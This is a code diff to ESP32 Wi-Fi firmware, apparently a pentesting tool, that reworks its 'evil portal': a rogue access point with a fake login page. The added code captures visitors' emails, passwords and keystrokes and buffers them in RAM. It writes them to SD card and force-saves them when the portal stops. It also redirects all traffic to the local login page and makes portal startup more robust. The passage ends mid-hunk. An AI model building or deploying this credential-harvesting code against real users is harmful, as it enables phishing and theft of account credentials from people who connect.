@@ -21,6 +21,7 @@
 #include "managers/ap_manager.h"
 #include "managers/rgb_manager.h"
 #include "managers/settings_manager.h"
+#include "managers/status_display_manager.h"
 #include "nvs_flash.h"
 #include <core/dns_server.h>
 #include <ctype.h>
@@ -36,7 +37,8 @@
 #ifdef WITH_SCREEN
 #include "managers/views/music_visualizer.h"
 #endif
-#include "managers/sd_card_manager.h" // Add SD card manager include
+#include "managers/sd_card_manager.h"
+#include "core/scan_saver.h"
 #include "managers/views/terminal_screen.h"
 #include "core/glog.h"
 #include "core/utils.h" // Add utils include
@@ -318,6 +320,212 @@ static bool use_html_buffer = false;
 static bool portal_sd_jit_mounted = false;
 static bool portal_display_suspended = false;
 
+#define PORTAL_KEYSTROKE_BUF_SZ 512
+#define PORTAL_CREDS_BUF_SZ 384
+static char s_portal_keystroke_buf[PORTAL_KEYSTROKE_BUF_SZ];
+static size_t s_portal_keystroke_len = 0;
+static char s_portal_creds_buf[PORTAL_CREDS_BUF_SZ];
+static size_t s_portal_creds_len = 0;
+
+static void portal_flush_buffers_to_sd(void) {
+#if defined(CONFIG_BUILD_CONFIG_TEMPLATE)
+    if (strcmp(CONFIG_BUILD_CONFIG_TEMPLATE, "somethingsomething") != 0) return;
+#endif
+    
+    if (s_portal_keystroke_len == 0 && s_portal_creds_len == 0) {
+        ESP_LOGD(TAG, "portal_flush: no data to flush");
+        return;
+    }
+    
+    ESP_LOGI(TAG, "portal_flush: triggered (keystrokes=%zu bytes, creds=%zu bytes)", 
+             s_portal_keystroke_len, s_portal_creds_len);
+    
+    if (current_keystrokes_filename[0] == '\0' && current_creds_filename[0] == '\0') {
+        ESP_LOGW(TAG, "portal_flush: no filenames configured, discarding buffers");
+        s_portal_keystroke_len = 0;
+        s_portal_creds_len = 0;
+        return;
+    }
+
+    // sd operations need some internal heap for spi/dma but can't use psram for dma
+    // somethingsomething build has very limited internal heap (~1kb free during portal)
+    // set threshold low enough to actually flush but high enough to avoid oom during mount
+    const size_t min_internal_heap = 768;
+    size_t free_internal = heap_caps_get_free_size(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
+    if (free_internal < min_internal_heap) {
+        ESP_LOGW(TAG, "portal_flush: insufficient internal heap (%zu < %zu), deferring flush", 
+                 free_internal, min_internal_heap);
+        return;
+    }
+
+    bool display_was_suspended = false;
+    esp_err_t mount_err = sd_card_mount_for_flush(&display_was_suspended);
+    if (mount_err != ESP_OK) {
+        ESP_LOGE(TAG, "portal_flush: sd mount failed: %s, data lost", esp_err_to_name(mount_err));
+        s_portal_keystroke_len = 0;
+        s_portal_creds_len = 0;
+        return;
+    }
+    ESP_LOGI(TAG, "portal_flush: sd mounted successfully");
+
+    if (current_keystrokes_filename[0] != '\0' && s_portal_keystroke_len > 0) {
+        FILE *f = fopen(current_keystrokes_filename, "a");
+        if (f) {
+            size_t written = fwrite(s_portal_keystroke_buf, 1, s_portal_keystroke_len, f);
+            fclose(f);
+            ESP_LOGI(TAG, "portal_flush: wrote %zu keystrokes bytes to %s", 
+                     written, current_keystrokes_filename);
+        } else {
+            ESP_LOGE(TAG, "portal_flush: failed to open keystrokes file: %s", current_keystrokes_filename);
+        }
+        s_portal_keystroke_len = 0;
+    }
+    
+    if (current_creds_filename[0] != '\0' && s_portal_creds_len > 0) {
+        FILE *f = fopen(current_creds_filename, "a");
+        if (f) {
+            size_t written = fwrite(s_portal_creds_buf, 1, s_portal_creds_len, f);
+            fclose(f);
+            ESP_LOGI(TAG, "portal_flush: wrote %zu creds bytes to %s", 
+                     written, current_creds_filename);
+        } else {
+            ESP_LOGE(TAG, "portal_flush: failed to open creds file: %s", current_creds_filename);
+        }
+        s_portal_creds_len = 0;
+    }
+    
+    sd_card_unmount_after_flush(display_was_suspended);
+    ESP_LOGI(TAG, "portal_flush: complete, sd unmounted");
+}
+
+// forced flush that bypasses heap check - use only on portal stop as last resort to save data
+static void portal_force_flush_to_sd(void) {
+#if defined(CONFIG_BUILD_CONFIG_TEMPLATE)
+    if (strcmp(CONFIG_BUILD_CONFIG_TEMPLATE, "somethingsomething") != 0) return;
+#endif
+    
+    if (s_portal_keystroke_len == 0 && s_portal_creds_len == 0) {
+        return;
+    }
+    
+    size_t free_internal = heap_caps_get_free_size(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
+    ESP_LOGW(TAG, "portal_force_flush: attempting flush with only %zu bytes internal heap", free_internal);
+    
+    if (current_keystrokes_filename[0] == '\0' && current_creds_filename[0] == '\0') {
+        ESP_LOGE(TAG, "portal_force_flush: no filenames, losing %zu keystrokes + %zu creds bytes",
+                 s_portal_keystroke_len, s_portal_creds_len);
+        s_portal_keystroke_len = 0;
+        s_portal_creds_len = 0;
+        return;
+    }
+
+    bool display_was_suspended = false;
+    esp_err_t mount_err = sd_card_mount_for_flush(&display_was_suspended);
+    if (mount_err != ESP_OK) {
+        ESP_LOGE(TAG, "portal_force_flush: sd mount failed: %s, losing %zu keystrokes + %zu creds bytes",
+                 esp_err_to_name(mount_err), s_portal_keystroke_len, s_portal_creds_len);
+        s_portal_keystroke_len = 0;
+        s_portal_creds_len = 0;
+        return;
+    }
+
+    if (current_keystrokes_filename[0] != '\0' && s_portal_keystroke_len > 0) {
+        FILE *f = fopen(current_keystrokes_filename, "a");
+        if (f) {
+            size_t written = fwrite(s_portal_keystroke_buf, 1, s_portal_keystroke_len, f);
+            fclose(f);
+            ESP_LOGI(TAG, "portal_force_flush: saved %zu keystrokes bytes", written);
+        }
+        s_portal_keystroke_len = 0;
+    }
+    
+    if (current_creds_filename[0] != '\0' && s_portal_creds_len > 0) {
+        FILE *f = fopen(current_creds_filename, "a");
+        if (f) {
+            size_t written = fwrite(s_portal_creds_buf, 1, s_portal_creds_len, f);
+            fclose(f);
+            ESP_LOGI(TAG, "portal_force_flush: saved %zu creds bytes", written);
+        }
+        s_portal_creds_len = 0;
+    }
+    
+    sd_card_unmount_after_flush(display_was_suspended);
+}
+
+static SemaphoreHandle_t g_wifi_ctrl_mutex = NULL;
+static bool g_ap_diag_registered = false;
+static esp_event_handler_instance_t g_ap_diag_wifi_inst;
+static esp_event_handler_instance_t g_ap_diag_ip_inst;
+
+static void wifi_ap_diag_event_handler(void *arg, esp_event_base_t event_base, int32_t event_id,
+                                       void *event_data) {
+    (void)arg;
+    if (event_base == WIFI_EVENT) {
+        switch (event_id) {
+            case WIFI_EVENT_AP_START:
+                ESP_LOGI(TAG, "ap: started");
+                break;
+            case WIFI_EVENT_AP_STOP:
+                ESP_LOGI(TAG, "ap: stopped");
+                break;
+            case WIFI_EVENT_AP_STACONNECTED: {
+                const wifi_event_ap_staconnected_t *e = (const wifi_event_ap_staconnected_t *)event_data;
+                if (e) {
+                    ESP_LOGI(TAG, "ap: sta connected: " MACSTR " aid=%d", MAC2STR(e->mac), (int)e->aid);
+                }
+                break;
+            }
+            case WIFI_EVENT_AP_STADISCONNECTED: {
+                const wifi_event_ap_stadisconnected_t *e = (const wifi_event_ap_stadisconnected_t *)event_data;
+                if (e) {
+                    ESP_LOGI(TAG, "ap: sta disconnected: " MACSTR " aid=%d reason=%d", MAC2STR(e->mac),
+                             (int)e->aid, (int)e->reason);
+                }
+                break;
+            }
+            default:
+                break;
+        }
+    } else if (event_base == IP_EVENT) {
+        switch (event_id) {
+            case IP_EVENT_AP_STAIPASSIGNED: {
+                const ip_event_ap_staipassigned_t *e = (const ip_event_ap_staipassigned_t *)event_data;
+                if (e) {
+                    ESP_LOGI(TAG, "ap: dhcp assigned ip: " IPSTR, IP2STR(&e->ip));
+                } else {
+                    ESP_LOGI(TAG, "ap: dhcp assigned ip");
+                }
+                break;
+            }
+            default:
+                break;
+        }
+    }
+}
+
+static bool wifi_ctrl_lock(TickType_t ticks_to_wait) {
+    if (g_wifi_ctrl_mutex == NULL) {
+        g_wifi_ctrl_mutex = xSemaphoreCreateMutex();
+        if (g_wifi_ctrl_mutex == NULL) return false;
+    }
+    return xSemaphoreTake(g_wifi_ctrl_mutex, ticks_to_wait) == pdTRUE;
+}
+
+static void wifi_ctrl_unlock(void) {
+    if (g_wifi_ctrl_mutex) xSemaphoreGive(g_wifi_ctrl_mutex);
+}
+
+static esp_err_t wifi_stop_safely(void) {
+    wifi_mode_t mode = WIFI_MODE_NULL;
+    esp_err_t st = esp_wifi_get_mode(&mode);
+    if (st == ESP_ERR_WIFI_NOT_INIT) return ESP_OK;
+    if (st != ESP_OK) return st;
+
+    esp_err_t r = esp_wifi_stop();
+    if (r == ESP_ERR_WIFI_NOT_STARTED) return ESP_OK;
+    return r;
+}
+
 // single reusable transfer buffer for streaming to reduce heap churn
 static char *g_stream_buf = NULL;
 static SemaphoreHandle_t g_stream_buf_mutex = NULL;
@@ -529,15 +737,18 @@ static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t e
         // Clean, single-line disconnect logging
         if (manual_disconnect) {
             glog("WiFi disconnected manually\n");
+            status_display_show_status("WiFi Disconnected");
             manual_disconnect = false; // Reset the flag
         } else {
             glog("WiFi disconnected: %s (reason %d)\n", reason_str, disconnected->reason);
+            status_display_show_status("WiFi Lost");
         }
         
         xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT);
     } else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
         ip_event_got_ip_t* event = (ip_event_got_ip_t*) event_data;
         glog("Got IP: %s\n", ip4addr_ntoa(&event->ip_info.ip));
+        status_display_show_status("WiFi Connected");
         
         xEventGroupSetBits(wifi_event_group, WIFI_CONNECTED_BIT);
     }
@@ -952,29 +1163,37 @@ esp_err_t file_handler(httpd_req_t *req) {
         size_t maxlen = sizeof(local_path) - strlen("/mnt") - 1;
         snprintf(local_path, sizeof(local_path), "/mnt%.*s", (int)maxlen, uri);
     }
+
+    // somethingsomething template shares spi bus; sd may be unmounted most of the time
+    bool require_jit = false;
+#ifdef CONFIG_BUILD_CONFIG_TEMPLATE
+    if (strcmp(CONFIG_BUILD_CONFIG_TEMPLATE, "somethingsomething") == 0) {
+        require_jit = true;
+    }
+#endif
+
+    bool display_was_suspended = false;
+    bool did_mount = false;
+    if (require_jit && !sd_card_manager.is_initialized) {
+        did_mount = (sd_card_mount_for_flush(&display_was_suspended) == ESP_OK);
+    }
+
     FILE *f = fopen(local_path, "r");
     if (f) {
         fclose(f);
-        return stream_data_to_client(req, local_path, content_type);
+        esp_err_t r = stream_data_to_client(req, local_path, content_type);
+        if (did_mount) sd_card_unmount_after_flush(display_was_suspended);
+        return r;
     }
 
-    char *host = get_host_from_req(req);
-    if (host == NULL) {
-        httpd_resp_set_status(req, "400 Bad Request");
-        httpd_resp_send(req, NULL, 0);
-        return ESP_FAIL;
-    }
+    if (did_mount) sd_card_unmount_after_flush(display_was_suspended);
 
-    char file_url[512];
-    build_file_url(host, uri, file_url, sizeof(file_url));
-
-    printf("Determined content type: %s for URI: %s\n", content_type, uri);
-
-    esp_err_t result = stream_data_to_client(req, file_url, content_type);
-
-    free(host);
-
-    return result;
+    // never proxy captive requests to the real internet; keep responses local
+    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+    httpd_resp_set_status(req, "302 Found");
+    httpd_resp_set_hdr(req, "Location", "/login");
+    httpd_resp_send(req, NULL, 0);
+    return ESP_OK;
 }
 
 esp_err_t done_handler(httpd_req_t *req) {
@@ -1041,31 +1260,40 @@ esp_err_t get_log_handler(httpd_req_t *req) {
     char body[256] = {0};
     int received = 0;
 
+    bool require_jit = false;
+#ifdef CONFIG_BUILD_CONFIG_TEMPLATE
+    require_jit = (strcmp(CONFIG_BUILD_CONFIG_TEMPLATE, "somethingsomething") == 0);
+#endif
+
     while ((received = httpd_req_recv(req, body, sizeof(body) - 1)) > 0) {
         body[received] = '\0';
 
-        printf("Received chunk: %s\n", body);
-
-        // Save to SD card if available and filename is set
-        if (sd_card_manager.is_initialized && current_keystrokes_filename[0] != '\0') {
-            FILE* f = fopen(current_keystrokes_filename, "a");
-            if (f) {
-                fprintf(f, "%s", body); // Append the chunk
-                fclose(f);
+        if (current_keystrokes_filename[0] != '\0') {
+            if (!require_jit) {
+                if (sd_card_manager.is_initialized) {
+                    FILE *f = fopen(current_keystrokes_filename, "a");
+                    if (f) { 
+                        fprintf(f, "%s", body); 
+                        fclose(f); 
+                    }
+                }
             } else {
-                printf("Failed to open %s for appending\n", current_keystrokes_filename);
+                size_t chunk = strlen(body);
+                if (s_portal_keystroke_len + chunk >= PORTAL_KEYSTROKE_BUF_SZ) {
+                    portal_flush_buffers_to_sd();
+                    chunk = strlen(body);
+                }
+                size_t avail = PORTAL_KEYSTROKE_BUF_SZ - s_portal_keystroke_len;
+                if (chunk > avail) chunk = avail;
+                memcpy(s_portal_keystroke_buf + s_portal_keystroke_len, body, chunk);
+                s_portal_keystroke_len += chunk;
             }
         }
     }
 
-    if (received < 0) {
-        printf("Failed to receive request body");
-        return ESP_FAIL;
-    }
+    if (received < 0) return ESP_FAIL;
 
-    const char *resp_str = "Body content logged successfully";
-    httpd_resp_send(req, resp_str, strlen(resp_str));
-
+    httpd_resp_send(req, "Body content logged successfully", 30);
     return ESP_OK;
 }
 
@@ -1073,6 +1301,11 @@ esp_err_t get_info_handler(httpd_req_t *req) {
     char query[256] = {0};
     char decoded_email[64] = {0};
     char decoded_password[64] = {0};
+
+    bool require_jit = false;
+#ifdef CONFIG_BUILD_CONFIG_TEMPLATE
+    require_jit = (strcmp(CONFIG_BUILD_CONFIG_TEMPLATE, "somethingsomething") == 0);
+#endif
 
     if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
         char email_val[64] = {0};
@@ -1083,20 +1316,34 @@ esp_err_t get_info_handler(httpd_req_t *req) {
         if (get_query_param_value(query, "password", pass_val, sizeof(pass_val)) == ESP_OK) {
             url_decode(decoded_password, pass_val);
         }
-        printf("Captured credentials: %s / %s\n", decoded_email, decoded_password);
+        glog("Captured credentials: %s / %s\n", decoded_email, decoded_password);
 
-        // Save credentials to SD card if available and filename is set
-        if (sd_card_manager.is_initialized && current_creds_filename[0] != '\0') {
-            FILE* f = fopen(current_creds_filename, "a");
-            if (f) {
-                // Optionally add a timestamp or delimiter here
-                fprintf(f, "Email: %s, Password: %s\n", decoded_email, decoded_password);
-                fclose(f);
-            } else {
-                printf("Failed to open %s for appending\n", current_creds_filename);
+        if (current_creds_filename[0] != '\0') {
+            char line[128];
+            int n = snprintf(line, sizeof(line), "Email: %s, Password: %s\n", decoded_email, decoded_password);
+            if (n > 0 && (size_t)n < sizeof(line)) {
+                if (!require_jit) {
+                    if (sd_card_manager.is_initialized) {
+                        FILE *f = fopen(current_creds_filename, "a");
+                        if (f) { 
+                            fwrite(line, 1, (size_t)n, f); 
+                            fclose(f); 
+                        }
+                    }
+                } else {
+                    size_t cp = (size_t)n;
+                    if (s_portal_creds_len + cp > PORTAL_CREDS_BUF_SZ) {
+                        portal_flush_buffers_to_sd();
+                        cp = (size_t)n;
+                        if (cp > PORTAL_CREDS_BUF_SZ) cp = PORTAL_CREDS_BUF_SZ;
+                    }
+                    memcpy(s_portal_creds_buf + s_portal_creds_len, line, cp);
+                    s_portal_creds_len += cp;
+                }
             }
         }
     }
+
     if (login_done) {
         httpd_resp_set_status(req, "204 No Content");
         httpd_resp_send(req, NULL, 0);
@@ -1214,13 +1461,68 @@ static esp_err_t captive_portal_head_ok_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 
+static void portal_log_heap_caps(const char *where) {
+    const size_t free8 = heap_caps_get_free_size(MALLOC_CAP_8BIT);
+    const size_t free_internal = heap_caps_get_free_size(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
+    const size_t largest_internal = heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
+    const size_t free_spiram = heap_caps_get_free_size(MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
+    ESP_LOGI(TAG, "portal heap %s: free8=%u internal=%u largest_internal=%u spiram=%u",
+             where,
+             (unsigned)free8,
+             (unsigned)free_internal,
+             (unsigned)largest_internal,
+             (unsigned)free_spiram);
+}
+
 httpd_handle_t start_portal_webserver(void) {
+    // Stop any existing server instance to prevent EADDRINUSE (error 112)
+    if (evilportal_server != NULL) {
+        printf("Stopping existing portal webserver before starting new one\n");
+        httpd_stop(evilportal_server);
+        evilportal_server = NULL;
+        vTaskDelay(pdMS_TO_TICKS(100)); // Small delay to ensure port is released
+    }
+
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
     config.max_uri_handlers = 32;
     config.max_open_sockets = 13; // Increased from 7
     config.backlog_conn = 10;     // Increased from 7
-    config.stack_size = 6144;
-    if (httpd_start(&evilportal_server, &config) == ESP_OK) {
+    config.server_port = 80;
+    // ctrl_port must be unique across all httpd instances (ap_manager uses 32768)
+    config.ctrl_port = 32769;
+    config.lru_purge_enable = true;
+    config.stack_size = 4096;
+#if CONFIG_FREERTOS_UNICORE
+    config.core_id = 0;
+#endif
+
+    portal_log_heap_caps("pre_start");
+
+    esp_err_t ret = ESP_FAIL;
+    for (int ctrl_try = 0; ctrl_try < 4; ctrl_try++) {
+        config.ctrl_port = 32769 + ctrl_try;
+        ret = httpd_start(&evilportal_server, &config);
+
+        if (ret == ESP_ERR_HTTPD_TASK && config.stack_size > 3072) {
+            ESP_LOGW(TAG, "portal httpd_start failed with ESP_ERR_HTTPD_TASK, retrying with smaller stack");
+            portal_log_heap_caps("start_failed_httpd_task");
+            config.stack_size = 3072;
+            vTaskDelay(pdMS_TO_TICKS(50));
+            ret = httpd_start(&evilportal_server, &config);
+        }
+
+        if (ret == ESP_OK) {
+            break;
+        }
+
+        // most common non-task failure is EADDRINUSE on server_port/ctrl_port
+        ESP_LOGW(TAG, "portal httpd_start failed (ctrl_port=%d): %s", config.ctrl_port, esp_err_to_name(ret));
+        vTaskDelay(pdMS_TO_TICKS(100));
+        evilportal_server = NULL;
+    }
+    if (ret == ESP_OK) {
+        printf("Portal webserver started successfully on port 80\n");
+        portal_log_heap_caps("post_start");
         httpd_uri_t portal_uri = {
             .uri = "/login", .method = HTTP_GET, .handler = portal_handler, .user_ctx = NULL};
         httpd_uri_t portal_android_get = {.uri = "/generate_204", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
@@ -1292,15 +1594,47 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_register_uri_handler(evilportal_server, &done_uri);
         httpd_register_err_handler(evilportal_server, HTTPD_404_NOT_FOUND,
                                    captive_portal_redirect_handler);
+    } else {
+        printf("ERROR: Failed to start portal webserver: %s (0x%x)\n", esp_err_to_name(ret), ret);
+        portal_log_heap_caps("start_failed_final");
+        evilportal_server = NULL;
     }
     return evilportal_server;
 }
 
+static void portal_stop_services_only(void) {
+    login_done = false;
+
+    if (dns_handle != NULL) {
+        stop_dns_server(dns_handle);
+        dns_handle = NULL;
+    }
+
+    if (evilportal_server != NULL) {
+        httpd_stop(evilportal_server);
+        evilportal_server = NULL;
+    }
+}
+
 esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *SSID, const char *Password,
                                           const char *ap_ssid, const char *domain) {
+    if (!wifi_ctrl_lock(pdMS_TO_TICKS(2000))) {
+        ESP_LOGE(TAG, "portal start: wifi ctrl mutex lock failed");
+        return ESP_FAIL;
+    }
+
+    // temporarily increase wifi logging while debugging portal association failures
+    esp_log_level_set("wifi", ESP_LOG_WARN);
+
+    // restarting a portal while it's active must tear down http/dns first, otherwise
+    // the httpd/dns tasks keep using wifi while we stop/reconfigure it and we crash
+    portal_stop_services_only();
+
     login_done = false; // Reset login state on start
-    current_creds_filename[0] = '\0'; // Reset filenames at the start
+    current_creds_filename[0] = '\0';
     current_keystrokes_filename[0] = '\0';
+    s_portal_keystroke_len = 0;
+    s_portal_creds_len = 0;
     portal_sd_jit_mounted = false;
     portal_display_suspended = false;
     // jit mount sd for somethingsomething template only
@@ -1349,6 +1683,14 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
         }
     }
 
+    // Unmount SD after filename generation to free SPI bus for display/WiFi operations
+    if (portal_sd_jit_mounted) {
+        sd_card_unmount_after_flush(portal_display_suspended);
+        // Reset flags since we've unmounted - handlers will JIT mount on demand
+        portal_sd_jit_mounted = false;
+        portal_display_suspended = false;
+    }
+
     // Check if we need to use the internal default portal
     if (URLorFilePath != NULL && strcmp(URLorFilePath, "default") == 0) {
         strcpy(PORTALURL, "INTERNAL_DEFAULT_PORTAL");
@@ -1361,22 +1703,6 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
         strcpy(PORTALURL, "INTERNAL_DEFAULT_PORTAL");
     }
 
-    // Advertise Captive Portal API URI via DHCP (RFC 8910 / option 114) if available.
-    if (strlen(PORTALURL) > 0) {
-        esp_err_t rc = esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_CAPTIVEPORTAL_URI, (void *)PORTALURL, (uint32_t)(strlen(PORTALURL) + 1));
-        if (rc == ESP_ERR_ESP_NETIF_DHCP_ALREADY_STARTED) {
-            // DHCP server already running; restart it to apply the option
-            esp_netif_dhcps_stop(wifiAP);
-            rc = esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_CAPTIVEPORTAL_URI, (void *)PORTALURL, (uint32_t)(strlen(PORTALURL) + 1));
-            esp_netif_dhcps_start(wifiAP);
-        }
-        if (rc != ESP_OK) {
-            printf("Failed to set captive portal DHCP option: %s\n", esp_err_to_name(rc));
-        } else {
-            printf("Advertised captive portal URI via DHCP: %s\n", PORTALURL);
-        }
-    }
-
     // Domain is fetched from settings in commandline.c, just copy it if provided
     if (domain != NULL && strlen(domain) < sizeof(domain_str)) {
          strlcpy(domain_str, domain, sizeof(domain_str));
@@ -1384,22 +1710,21 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
          domain_str[0] = '\0'; // Ensure empty if invalid
     }
 
-    ap_manager_stop_services();
+    ap_manager_stop_services_keep_wifi();
+
+    // stop wifi before changing mode/config
+    esp_err_t stop_err = wifi_stop_safely();
+    if (stop_err != ESP_OK) {
+        ESP_LOGW(TAG, "portal start: esp_wifi_stop: %s", esp_err_to_name(stop_err));
+    }
+    vTaskDelay(pdMS_TO_TICKS(150));
 
     esp_netif_dns_info_t dnsserver;
 
     uint32_t my_ap_ip = esp_ip4addr_aton("192.168.4.1");
 
-    esp_netif_ip_info_t ipInfo_ap;
-    ipInfo_ap.ip.addr = my_ap_ip;
-    ipInfo_ap.gw.addr = my_ap_ip;
-    esp_netif_set_ip4_addr(&ipInfo_ap.netmask, 255, 255, 255, 0);
-    esp_netif_dhcps_stop(wifiAP); // stop before setting ip WifiAP
-    esp_netif_set_ip_info(wifiAP, &ipInfo_ap);
-    esp_netif_dhcps_start(wifiAP);
-
     wifi_config_t ap_config = {.ap = {
-                                   .channel = 0,
+                                   .channel = 6,
                                    .ssid_hidden = 0,
                                    .max_connection = 8,
                                    .beacon_interval = 100,
@@ -1416,19 +1741,49 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
     if (Password != NULL && Password[0] != '\0') {
         ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
         strlcpy((char *)ap_config.ap.password, Password, sizeof(ap_config.ap.password));
+        ESP_LOGI(TAG, "portal ap auth: wpa2-psk");
     } else {
         ap_config.ap.authmode = WIFI_AUTH_OPEN;
         memset(ap_config.ap.password, 0, sizeof(ap_config.ap.password));
+        ESP_LOGI(TAG, "portal ap auth: open");
     }
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+    esp_wifi_set_ps(WIFI_PS_NONE);
+
+    // be conservative for client compatibility (esp32-c5 can do more, but this avoids weird auth edge cases)
+    (void)esp_wifi_set_bandwidth(WIFI_IF_AP, WIFI_BW_HT20);
+    (void)esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
+    dnsserver.ip.u_addr.ip4.addr = esp_ip4addr_aton("192.168.4.1");
+    dnsserver.ip.type = ESP_IPADDR_TYPE_V4;
+    ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_config));
+    esp_err_t start_err = esp_wifi_start();
+    if (start_err != ESP_OK && start_err != ESP_ERR_WIFI_NOT_STARTED) {
+        ESP_LOGE(TAG, "portal start: esp_wifi_start failed: %s", esp_err_to_name(start_err));
+        wifi_ctrl_unlock();
+        return start_err;
+    }
+
+    // configure dhcp/dns *after* wifi start so we don't churn dhcps state mid-transition
+    esp_netif_ip_info_t ipInfo_ap;
+    ipInfo_ap.ip.addr = my_ap_ip;
+    ipInfo_ap.gw.addr = my_ap_ip;
+    esp_netif_set_ip4_addr(&ipInfo_ap.netmask, 255, 255, 255, 0);
+
+    esp_netif_dhcps_stop(wifiAP);
+
+    // hand out ourselves as dns server
     dhcps_offer_t dhcps_dns_value = OFFER_DNS;
     esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER,
                            &dhcps_dns_value, sizeof(dhcps_dns_value));
-    dnsserver.ip.u_addr.ip4.addr = esp_ip4addr_aton("192.168.4.1");
-    dnsserver.ip.type = ESP_IPADDR_TYPE_V4;
     esp_netif_set_dns_info(wifiAP, ESP_NETIF_DNS_MAIN, &dnsserver);
-    ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_config));
-    ESP_ERROR_CHECK(esp_wifi_start());
+
+    // rfc8910 option114: always point to the local portal entrypoint
+    const char *cap_uri = "http://192.168.4.1/login";
+    esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_CAPTIVEPORTAL_URI,
+                           (void *)cap_uri, (uint32_t)(strlen(cap_uri) + 1));
+
+    esp_netif_set_ip_info(wifiAP, &ipInfo_ap);
+    esp_netif_dhcps_start(wifiAP);
 
     start_portal_webserver();
 
@@ -1442,13 +1797,21 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
     } else {
         printf("Failed to start DNS server\n");
     }
-    
-    return ESP_OK; // Add return value at the end
+
+    wifi_ctrl_unlock();
+    return ESP_OK;
 }
 
 void wifi_manager_stop_evil_portal() {
-    login_done = false; // Reset login state on stop
-    current_creds_filename[0] = '\0'; // Clear saved filenames
+    if (!wifi_ctrl_lock(pdMS_TO_TICKS(2000))) {
+        ESP_LOGE(TAG, "portal stop: wifi ctrl mutex lock failed");
+        return;
+    }
+
+    login_done = false;
+    // use forced flush on stop to save data even if heap is critically low
+    portal_force_flush_to_sd();
+    current_creds_filename[0] = '\0';
     current_keystrokes_filename[0] = '\0';
     
     // Free captured HTML buffer when portal stops to reclaim RAM
@@ -1464,9 +1827,16 @@ void wifi_manager_stop_evil_portal() {
         evilportal_server = NULL;
     }
 
-    ESP_ERROR_CHECK(esp_wifi_stop());
+    esp_err_t stop_err = wifi_stop_safely();
+    if (stop_err != ESP_OK) {
+        ESP_LOGW(TAG, "portal stop: esp_wifi_stop: %s", esp_err_to_name(stop_err));
+    }
+    vTaskDelay(pdMS_TO_TICKS(150));
 
     ap_manager_init();
+
+    // restore previous wifi log noise level
+    esp_log_level_set("wifi", ESP_LOG_ERROR);
 
     // jit unmount sd if we mounted it for portal start
     if (portal_sd_jit_mounted) {
@@ -1474,6 +1844,8 @@ void wifi_manager_stop_evil_portal() {
         portal_sd_jit_mounted = false;
         portal_display_suspended = false;
     }
+
+    wifi_ctrl_unlock();
 }
 
 bool wifi_manager_is_evil_portal_active(void) {
@@ -1684,6 +2056,20 @@ void wifi_manager_init(void) {
     ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP,
                                                         &wifi_event_handler, NULL, NULL));
 
+    // AP-side diagnostics (connect/disconnect + dhcp assignment). helps debug portal connect failures.
+    if (!g_ap_diag_registered) {
+        esp_err_t r1 = esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
+                                                          &wifi_ap_diag_event_handler, NULL, &g_ap_diag_wifi_inst);
+        esp_err_t r2 = esp_event_handler_instance_register(IP_EVENT, IP_EVENT_AP_STAIPASSIGNED,
+                                                          &wifi_ap_diag_event_handler, NULL, &g_ap_diag_ip_inst);
+        if (r1 == ESP_OK && r2 == ESP_OK) {
+            g_ap_diag_registered = true;
+        } else {
+            ESP_LOGW(TAG, "ap diag handler register failed: wifi=%s ip=%s",
+                     esp_err_to_name(r1), esp_err_to_name(r2));
+        }
+    }
+
     // Set WiFi mode to STA (station)
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
 
@@ -1760,6 +2146,7 @@ void wifi_manager_configure_sta_from_settings(void) {
 
 void wifi_manager_start_scan() {
     log_heap_status(TAG, "scan_start_pre");
+    status_display_show_status("WiFi Scanning...");
     // Free any previous selections or scan buffers before starting a fresh scan
     if (selected_aps != NULL) {
         free(selected_aps);
@@ -1804,14 +2191,20 @@ void wifi_manager_start_scan() {
         .bssid = NULL,
         .channel = 0,
         .show_hidden = true,
-        .scan_time = {.active.min = 450, .active.max = 500, .passive = 500}};
+#ifdef CONFIG_IDF_TARGET_ESP32C5
+        // Target ~5s total sweep on C5
+        .scan_time = {.active.min = 250, .active.max = 300, .passive = 300}
+#else
+        .scan_time = {.active.min = 450, .active.max = 500, .passive = 500}
+#endif
+    };
 
     rgb_manager_set_color(&rgb_manager, -1, 50, 255, 50, false);
 
     printf("WiFi Scan started\n");
     #ifdef CONFIG_IDF_TARGET_ESP32C5
-        printf("Please wait 10 Seconds...\n");
-        TERMINAL_VIEW_ADD_TEXT("Please wait 10 Seconds...\n");
